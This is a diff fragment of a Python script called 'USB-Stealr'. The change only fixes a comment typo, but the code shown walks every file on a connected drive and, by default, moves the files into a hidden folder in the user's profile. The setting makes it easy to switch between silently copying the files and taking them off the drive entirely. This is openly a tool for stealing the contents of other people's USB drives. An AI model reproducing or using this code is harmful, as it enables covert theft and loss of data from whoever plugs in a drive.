@@ -6,7 +6,7 @@
 import win32api , glob , os ,shutil , getpass
 user_pc = getpass.getuser()
 try:
-	create_loc = ("C:\\Users\\"+user_pc+"\\USB-Stealr\\") # your specific path (Change this if uoi like )
+	create_loc = ("C:\\Users\\"+user_pc+"\\USB-Stealr\\") # your specific path (Change this if you like )
 	os.mkdir(create_loc)
 except FileExistsError:
 	pass
@@ -14,9 +14,9 @@ except FileExistsError:
 def operation_F(exist_drive):
 
 	root_src_dir = os.path.join(exist_drive)
-	root_target_dir = os.path.join("C:\\Users\\"+user_pc+"\\USB-Stealr\\") # your specific path (Change this if uoi like )
+	root_target_dir = os.path.join("C:\\Users\\"+user_pc+"\\USB-Stealr\\") # your specific path (Change this if you like )
 
-	operation= 'move' # 'copy' or 'move' (Change this if uoi like )
+	operation= 'move' # 'copy' or 'move' (Change this if you like )
 
 	for src_dir, dirs, files in os.walk(root_src_dir):
 	    dst_dir = src_dir.replace(root_src_dir, root_target_dir)
